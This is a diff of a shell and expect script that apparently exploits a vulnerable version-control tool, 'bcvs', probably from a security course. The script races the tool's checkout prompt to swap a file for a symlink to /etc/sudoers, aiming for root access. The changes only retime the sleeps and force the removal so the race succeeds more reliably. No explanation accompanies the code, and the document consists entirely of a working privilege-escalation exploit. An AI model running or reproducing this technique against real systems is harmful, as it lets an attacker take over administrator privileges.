@@ -5,7 +5,8 @@ touch helper.sh
 chmod +x helper.sh
 echo "
 cd /opt/bcvs
-rm sudoers_but_better
+sleep 5
+rm -f sudoers_but_better
 ln -s /etc/sudoers sudoers_but_better
 " >> helper.sh
 
@@ -124,7 +125,7 @@ sleep 0.5
 '
 
 #checkout fake sudoers, but wait when it tells ya to enter the log
-#this will take a while cuz sleep 30
+#this will take a while cuz sleep
 /usr/bin/expect -c '
 sleep 0.5
 cd /opt/bcvs
@@ -132,7 +133,7 @@ sleep 0.5
 spawn ./bcvs co sudoers_but_better
 sleep 0.5
 expect "Please write a SHORT explanation:\r"
-sleep 5
+sleep 10
 send -- "no\n"
 sleep 0.5
 ' && ./helper.sh
